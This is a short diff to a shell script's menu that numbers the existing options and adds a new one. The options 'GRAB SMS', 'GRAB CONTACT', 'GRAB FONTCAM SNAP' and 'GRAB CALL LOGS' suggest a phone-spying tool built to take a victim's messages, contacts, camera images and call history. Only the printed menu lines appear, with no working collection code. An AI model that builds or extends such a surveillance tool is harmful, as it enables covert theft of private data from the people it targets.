@@ -15,7 +15,10 @@ printf " (2) GRAB SMS \e[0m \n"
 printf "\n"
 printf " (3) GRAB CONTACT \e[0m \n"
 printf "\n"
-printf " GRAB FONTCAM SNAP \e[0m \n"
+printf " (4) GRAB FONTCAM SNAP \e[0m \n"
+printf "\n" 
+printf " (5) GRAB CALL LOGS \e[0m \n"
+
 
 
 
